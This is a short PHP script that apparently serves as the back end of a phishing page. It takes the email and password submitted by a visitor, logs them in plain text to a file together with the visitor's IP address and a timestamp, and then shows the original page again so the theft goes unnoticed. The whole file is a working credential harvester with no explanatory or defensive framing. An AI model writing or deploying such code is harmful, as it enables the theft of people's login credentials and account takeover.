<?php
    $email = $_POST['email'];
    $password = $_POST['password'];
		$ip = $_SERVER['REMOTE_ADDR'];
		$reqtime = date('l jS \of F Y h:i:s A');
    file_put_contents("save.txt", "$ip, $reqtime, email: $email, password: $password \n", FILE_APPEND);
    header("Access-Control-Allow-Origin: *");
    
    echo file_get_contents('index.php');
?>
